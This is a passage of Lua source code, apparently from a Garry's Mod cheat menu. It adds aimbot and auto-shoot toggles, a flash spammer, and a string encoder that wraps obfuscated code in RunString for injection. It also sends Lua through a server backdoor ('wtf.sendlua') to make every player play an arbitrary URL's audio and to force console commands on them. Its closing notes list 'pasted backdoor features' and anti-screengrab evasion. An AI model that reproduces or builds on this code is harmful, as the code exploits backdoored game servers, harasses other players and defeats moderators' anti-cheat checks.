        wtf.log("Flash Spammer Disabled")
        hook.Remove("Tick", flash_spam_hook )
        flash_spam_enable=false
    end
end)

create_button("FOV-Editor", tab_misc, 100, 25, 236, 40, function()
    Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
        LocalPlayer():ConCommand("fov_desired "..str)
        wtf.log("FOV Set: "..str)
    end)
end)

create_button("Encode-String", tab_misc, 100, 25, 346, 40, function()
    Derma_StringRequest("Encode String", "String To Encode", "", function(str)
        local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
        wtf.conoutRGB("ENCODED-STRING: ".."RunString("..encoded..")")
        SetClipboardText("RunString('"..encoded.."')")
        wtf.log("Check Console")
      end)
end)

create_checkbox("Aimbot(L-ALT)", tab_misc, 16, 70, function()
    aimbot_enable=not aimbot_enable
    if(aimbot_enable == false) then
        wtf.log("Aimbot Disabled")
    elseif(aimbot_enable == true) then
        wtf.log("Aimbot Enabled")
    end
end)

create_checkbox("Auto Shoot", tab_misc, 126, 70, function()
    autoshoot_enable=not autoshoot_enable
    if(autoshoot_enable == false) then
        wtf.log("Auto Shoot Disabled")
    elseif(autoshoot_enable == true) then
        wtf.log("Auto Shoot Enabled")
    end
end)

create_button("Play URL-Link", tab_sounds, 100, 25, 355, 445, function()
    Derma_StringRequest("Play URL", "URL:", "", function(str)
        wtf.sendlua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
        wtf.log("Playing: " .. str)
    end)
end)

create_button("Stop Sounds", tab_sounds, 100, 25, 245, 445, function()
    wtf.sendlua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
    wtf.log("Stopped Sounds")
end)

create_button("Wipe/Populate Players-Pannel", tab_players, 445, 20, 10, 455, function()
    player_panel[1]:GetCanvas():Clear() --/ Clear pannel
    plr_posX, plr_posY = 9, 10 --/ Reset points
    populate_players() --/ populate | add all players
end)

create_sound_buttons() --/ creates all sound buttons

--## NOTES
--## New Pasted backdoor features
--## Textured Background for menu
--## New Misc Features
--## Third-Person / Any Fov
--## Anti-Screengrab
--## Entity-ESP
--## Visuals change buttons around / move color editors to misc & add entity esp
